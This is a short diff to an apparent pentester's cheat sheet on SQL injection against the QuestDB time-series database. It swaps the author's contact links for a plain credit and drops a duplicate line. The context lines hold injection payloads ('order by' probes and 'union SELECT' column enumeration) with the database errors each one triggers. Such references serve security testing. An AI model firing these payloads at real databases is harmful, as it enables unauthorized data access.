@@ -1,6 +1,6 @@
 # QuestDB Injection (time series database):
 
-#### [Linkedin](https://www.linkedin.com/in/meisam-monsef-8693b347/) - [Telegram ID](https://t.me/meisamrce/) - [Telegram Channel](https://t.me/seccode) - [Email](mailto:meisamrce@gmail.com)
+#### add by Meisam Monsef 
 
 ## Comments:
 
@@ -15,7 +15,6 @@
 
         1' order by 100--                             #order column position is out of range [max=8]
         1' order by 8--                               #no error 
-        1' union SELECT 1--                           #queries have different number of columns
         1' union SELECT 1--                           #queries have different number of columns
         1' union SELECT 1,2,3,4,5,6,7,8--             #error queries have different number of columns
         1' union SELECT 1,2,3,4,5,6,7,8--             #error unsupported cast [column=8, from=INT, to=TIMESTAMP]
